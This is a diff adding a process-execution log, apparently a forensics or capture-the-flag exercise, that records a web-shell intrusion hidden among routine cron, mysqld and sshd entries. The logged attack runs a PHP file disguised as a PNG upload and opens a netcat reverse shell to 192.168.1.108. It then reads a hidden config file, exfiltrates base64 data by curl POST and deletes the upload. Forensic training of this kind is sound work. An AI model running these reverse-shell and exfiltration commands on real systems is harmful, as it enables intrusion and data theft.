@@ -1,0 +1,15 @@
+[2026-04-23 14:15:01] [PID:1024] [USER:root] /usr/sbin/CRON -f
+[2026-04-23 14:16:30] [PID:1055] [USER:root] /bin/sh -c "/root/backup_script.sh"
+[2026-04-23 14:18:12] [PID:1102] [USER:mysql] /usr/sbin/mysqld --daemonize
+[2026-04-23 14:20:00] [PID:1150] [USER:root] /usr/bin/apt-get update --quiet
+[2026-04-23 14:21:45] [PID:1180] [USER:syslog] /usr/sbin/rsyslogd -n -iNONE
+[2026-04-23 14:23:45] [PID:4510] [USER:www-data] /usr/bin/php-cgi /var/www/html/uploads/avatar_99.php.png
+[2026-04-23 14:24:12] [PID:4512] [USER:www-data] /usr/bin/whoami
+[2026-04-23 14:25:05] [PID:4514] [USER:www-data] /usr/bin/nc -e /bin/bash 192.168.1.108 4444
+[2026-04-23 14:25:10] [PID:1190] [USER:root] /bin/systemctl status apache2
+[2026-04-23 14:25:30] [PID:4515] [USER:www-data] /bin/ls -la /var/www/html/conf/
+[2026-04-23 14:26:05] [PID:4516] [USER:www-data] /usr/bin/id
+[2026-04-23 14:26:45] [PID:4518] [USER:www-data] /usr/bin/cat /var/www/html/conf/.ht_meta_data
+[2026-04-23 14:27:10] [PID:4520] [USER:www-data] /usr/bin/curl -X POST -d "data=QUxUQVl7V0VCX1RPX09TX1NURUFMVEhfREVURUNURUR9" http://192.168.1.108:8000/exfil
+[2026-04-23 14:28:00] [PID:4522] [USER:www-data] /usr/bin/rm -f /var/www/html/uploads/avatar_99.php.png
+[2026-04-23 14:29:15] [PID:1200] [USER:root] /usr/sbin/sshd -D
